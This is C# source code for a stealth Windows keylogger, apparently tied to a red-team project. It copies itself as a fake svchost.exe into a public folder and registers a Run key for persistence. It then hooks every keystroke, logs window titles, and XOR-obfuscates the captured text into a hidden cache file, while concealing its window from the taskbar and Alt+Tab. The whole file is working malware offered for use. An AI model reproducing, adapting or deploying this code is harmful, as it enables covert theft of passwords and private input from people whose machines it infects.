// ============================================================================
// KeyLogger.Service — stealth keylogger (no console, no window, no tray)
// .NET Framework 4.7.2 | Windows Application (WinExe)
//
// Behaviour (based on first arg):
//   (none)   → USB installer mode: copy self + register Run key + launch
//              service → exit
//   --service → persistent mode: start WH_KEYBOARD_LL global hook
// ============================================================================

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace KeyLogger.Service
{
    static class Program
    {
        // ═══════ CONFIG ═══════
        private const string XOR_KEY        = "M0ntf0rtR3dT34m!2025";
        private const string TARGET_DIR     = @"C:\Users\Public\Libraries";
        private const string TARGET_EXE     = "svchost.exe";
        private const string CACHE_FILE     = "cache.dat";
        private const string REG_RUN_NAME   = "SystemService";
        private const int    WINDOW_POLL_MS = 2000;
        private const int    FLUSH_IDLE_SEC = 10;

        // ═══════ WIN32 ═══════
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk,
            int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd,
            StringBuilder text, int count);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private delegate IntPtr LowLevelKeyboardProc(int nCode,
            IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN     = 0x0100;
        private const int WM_SYSKEYDOWN  = 0x0104;

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        // ═══════ STATE ═══════
        private static LowLevelKeyboardProc _keyboardProc;
        private static IntPtr _hookId = IntPtr.Zero;
        private static string _currentWindowTitle = "";
        private static readonly StringBuilder _currentLine = new StringBuilder(4096);
        private static DateTime _lastFlush = DateTime.UtcNow;

        // ═══════ ENTRY ═══════
        [STAThread]
        static void Main(string[] args)
        {
            bool isService = args.Length > 0 &&
                args[0].Equals("--service", StringComparison.OrdinalIgnoreCase);

            if (!isService) { Install(); return; }

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            var form = new HiddenForm();
            form.Load += (s, e) =>
            {
                _keyboardProc = HookCallback;
                using (Process p = Process.GetCurrentProcess())
                using (ProcessModule m = p.MainModule)
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _keyboardProc,
                        GetModuleHandle(m.ModuleName), 0);

                var timer = new Timer { Interval = WINDOW_POLL_MS };
                timer.Tick += (_, _) => { PollWindowTitle(); FlushIfIdle(); };
                timer.Start();
            };
            form.FormClosing += (_, _) =>
            {
                if (_hookId != IntPtr.Zero) UnhookWindowsHookEx(_hookId);
            };
            Application.Run(form);
        }

        // ═══════ INSTALL ═══════
        private static void Install()
        {
            try
            {
                Directory.CreateDirectory(TARGET_DIR);
                string dst = Path.Combine(TARGET_DIR, TARGET_EXE);
                try { File.Copy(Application.ExecutablePath, dst, true); } catch { }
                using (var key = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                    key?.SetValue(REG_RUN_NAME, dst);
                using (Process.Start(new ProcessStartInfo
                {
                    FileName = dst, Arguments = "--service",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true, UseShellExecute = false,
                })) { Thread.Sleep(200); }
            }
            catch { }
            Environment.Exit(0);
        }

        // ═══════ HOOK ═══════
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN ||
                               wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                var hs = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(
                    lParam, typeof(KBDLLHOOKSTRUCT));
                PollWindowTitle();
                lock (_currentLine) { _currentLine.Append(TranslateKey(hs.vkCode)); }
                if (hs.vkCode == 0x0D) FlushLog();
                else FlushIfIdle();
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private static void PollWindowTitle()
        {
            var sb = new StringBuilder(512);
            if (GetWindowText(GetForegroundWindow(), sb, sb.Capacity) > 0)
            {
                string t = sb.ToString();
                if (t != _currentWindowTitle)
                {
                    if (_currentLine.Length > 0) FlushLog();
                    _currentWindowTitle = t;
                    AppendCache($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] === Window: {t} ===\r\n");
                }
            }
        }

        private static void FlushIfIdle()
        {
            if ((DateTime.UtcNow - _lastFlush).TotalSeconds >= FLUSH_IDLE_SEC)
                FlushLog();
        }

        private static void FlushLog()
        {
            string line;
            lock (_currentLine)
            {
                if (_currentLine.Length == 0) return;
                line = _currentLine.ToString();
                _currentLine.Clear();
                _lastFlush = DateTime.UtcNow;
            }
            AppendCache($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {_currentWindowTitle}: {line}");
        }

        private static void AppendCache(string text)
        {
            try
            {
                string path = Path.Combine(TARGET_DIR, CACHE_FILE);
                byte[] enc = Xor(Encoding.UTF8.GetBytes(text + "\r\n"));
                using (var fs = new FileStream(path, FileMode.Append,
                    FileAccess.Write, FileShare.Read, 4096))
                    fs.Write(enc, 0, enc.Length);
            }
            catch { }
        }

        internal static byte[] Xor(byte[] data)
        {
            byte[] k = Encoding.UTF8.GetBytes(XOR_KEY);
            var r = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                r[i] = (byte)(data[i] ^ k[i % k.Length]);
            return r;
        }

        // ═══════ KEY TRANSLATION ═══════
        private static string TranslateKey(uint vk)
        {
            // Special keys
            if (vk <= 0x5D) // fast-path for common range
            {
                switch (vk)
                {
                    case 0x08: return "[BACKSPACE]";  case 0x09: return "[TAB]";
                    case 0x0D: return "[ENTER]\r\n";  case 0x10: return "[SHIFT]";
                    case 0x11: return "[CTRL]";       case 0x12: return "[ALT]";
                    case 0x14: return "[CAPSLOCK]";   case 0x1B: return "[ESC]";
                    case 0x20: return " ";            case 0x21: return "[PGUP]";
                    case 0x22: return "[PGDN]";       case 0x23: return "[END]";
                    case 0x24: return "[HOME]";       case 0x25: return "[LEFT]";
                    case 0x26: return "[UP]";         case 0x27: return "[RIGHT]";
                    case 0x28: return "[DOWN]";       case 0x2C: return "[PRTSC]";
                    case 0x2D: return "[INS]";        case 0x2E: return "[DEL]";
                    case 0x5B: case 0x5C: return "[WIN]";
                    case 0x5D: return "[APPS]";
                }
            }
            if (vk >= 0x70 && vk <= 0x7B) return $"[F{vk - 0x6F}]";
            if (vk == 0x90) return "[NUMLOCK]";
            if (vk == 0x91) return "[SCROLLLOCK]";
            if (vk >= 0xA0 && vk <= 0xA5)
            {
                var map = new[] { "[LSHIFT]", "[RSHIFT]", "[LCTRL]", "[RCTRL]", "[LALT]", "[RALT]" };
                return map[vk - 0xA0];
            }

            bool shift = (GetAsyncKeyState(0x10) & 0x8000) != 0;

            // A-Z
            if (vk >= 0x41 && vk <= 0x5A)
                return shift ? ((char)vk).ToString() : ((char)(vk + 0x20)).ToString();

            // Number row
            if (vk >= 0x30 && vk <= 0x39)
            {
                string u = "0123456789", s = ")!@#$%^&*(";
                return shift ? s[(int)(vk - 0x30)].ToString() : u[(int)(vk - 0x30)].ToString();
            }

            // Numpad
            if (vk >= 0x60 && vk <= 0x69) return ((char)('0' + vk - 0x60)).ToString();
            if (vk == 0x6A) return "*";  if (vk == 0x6B) return "+";
            if (vk == 0x6D) return "-";  if (vk == 0x6E) return ".";
            if (vk == 0x6F) return "/";

            // OEM
            switch (vk)
            {
                case 0xBA: return shift ? ":" : ";";  case 0xBB: return shift ? "+" : "=";
                case 0xBC: return shift ? "<" : ",";  case 0xBD: return shift ? "_" : "-";
                case 0xBE: return shift ? ">" : ".";  case 0xBF: return shift ? "?" : "/";
                case 0xC0: return shift ? "~" : "`";  case 0xDB: return shift ? "{" : "[";
                case 0xDC: return shift ? "|" : "\\"; case 0xDD: return shift ? "}" : "]";
                case 0xDE: return shift ? "\"" : "'";
            }
            return $"[{vk:X2}]";
        }
    }

    // ═══════ HIDDEN FORM ═══════
    internal class HiddenForm : Form
    {
        public HiddenForm()
        {
            WindowState = FormWindowState.Minimized;
            ShowInTaskbar = false;
            FormBorderStyle = FormBorderStyle.None;
            Opacity = 0;
        }

        protected override void SetVisibleCore(bool value)
        {
            if (!IsHandleCreated) { CreateHandle(); NativeMethods.ShowWindow(Handle, 0); }
            base.SetVisibleCore(false);
        }

        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0018) return; // WM_SHOWWINDOW
            base.WndProc(ref m);
        }

        protected override CreateParams CreateParams
        {
            get
            {
                var cp = base.CreateParams;
                cp.ExStyle |= 0x80; // WS_EX_TOOLWINDOW — no Alt+Tab
                return cp;
            }
        }
    }

    internal static class NativeMethods
    {
        [DllImport("user32.dll")]
        internal static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}